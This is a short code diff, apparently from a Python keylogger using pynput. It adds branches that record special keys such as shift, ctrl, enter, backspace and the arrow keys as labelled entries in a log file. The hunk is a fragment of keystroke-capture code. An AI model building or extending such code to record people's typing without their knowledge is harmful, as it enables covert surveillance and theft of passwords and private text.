@@ -79,6 +79,42 @@ def write_file(keys):
             if k.find("space")>0:
                 f.write('\n')
                 f.close()
+            elif key==Key.shift or key == Key.shift_l or key == Key.shift_r:
+                f.write("[shift] \n")
+            elif key == Key.ctrl_l or key == Key.ctrl_r:
+                f.write("[ctrl] \n")
+            elif key == Key.alt_l or key == Key.alt_gr:
+                f.write("[alt] \n")
+            elif key==Key.enter:
+                f.write("[enter] \n")
+            elif key == Key.backspace:
+                f.write("[backspace] \n")
+            elif key==Key.caps_lock:
+                f.write("[caps_lock] \n")
+            elif key==Key.tab:
+                f.write("[tab] \n")
+            elif key==Key.end:
+                f.write("[end] \n")
+            elif key==Key.home:
+                f.write("[home] \n")
+            elif key==Key.page_down:
+                f.write("[page_down] \n")
+            elif key==Key.page_up:
+                f.write("[page_up] \n")
+            elif key==Key.pause:
+                f.write("[pause] \n")
+            elif key==Key.insert:
+                f.write("[insert] \n")
+            elif key==Key.up:
+                f.write("[up] \n")
+            elif key==Key.down:
+                f.write("[down] \n")
+            elif key==Key.right:
+                f.write("[right] \n")
+            elif key==Key.left:
+                f.write("[left] \n")
+            elif key==Key.delete:
+                f.write("[delete] \n")
             elif k.find("Key") == -1:
                 f.write(k)
                 f.close()
